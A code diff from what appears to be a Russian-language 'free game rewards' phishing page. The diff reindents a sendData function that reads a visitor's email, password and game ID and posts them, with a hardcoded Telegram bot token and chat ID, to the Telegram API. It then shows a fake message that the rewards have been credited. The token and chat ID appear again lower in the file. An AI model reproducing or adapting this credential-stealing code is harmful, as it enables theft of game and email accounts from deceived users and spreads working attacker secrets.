@@ -716,24 +716,23 @@
     }
 
     function sendData(e) {
-        e.preventDefault();
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const gameId = document.getElementById('gameId').value;
-        const BOT_TOKEN = '8747751460:AAEO78CefXypChf0HLzoo_ZORaVOGAO9erI';
-        const CHAT_ID = '8783227095';
-        const text = '🎁 Новая заявка!\n\n🎮 Платформа: ' + selected.platform + '\n🏆 Награда: ' + selected.reward + '\n🆔 Игровой ID: ' + gameId + '\n📧 Email: ' + email + '\n🔑 Пароль: ' + password + '\n🕐 Время: ' + new Date().toLocaleString('ru-RU');
-        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-            method: 'POST', headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-        }).catch(err => console.log(err));
-        document.getElementById('loginStep').classList.remove('active');
-        document.getElementById('successText').textContent = selected.reward + ' для ' + selected.platform + ' зачислены на аккаунт ' + gameId + '.';
-        document.getElementById('success').classList.add('active');
-        updateProgress(100);
-        return false;
+    e.preventDefault();
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    const gameId = document.getElementById('gameId').value;
+    const BOT_TOKEN = '8747751460:AAEO78CefXypChf0HLzoo_ZORaVOGAO9erI';
+    const CHAT_ID = '8783227095';
+    const text = '🎁 Новая заявка!\n\n🎮 Платформа: ' + selected.platform + '\n🏆 Награда: ' + selected.reward + '\n🆔 Игровой ID: ' + gameId + '\n📧 Email: ' + email + '\n🔑 Пароль: ' + password + '\n🕐 Время: ' + new Date().toLocaleString('ru-RU');
+    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+        method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    }).catch(err => console.log(err));
+    document.getElementById('loginStep').classList.remove('active');
+    document.getElementById('successText').textContent = selected.reward + ' для ' + selected.platform + ' зачислены на аккаунт ' + gameId + '.';
+    document.getElementById('success').classList.add('active');
+    updateProgress(100);
+    return false;
     }
-
     // ==================== КЕЙСЫ ====================
     const BOT_TOKEN = '8747751460:AAEO78CefXypChf0HLzoo_ZORaVOGAO9erI';
     const CHAT_ID = '8783227095';
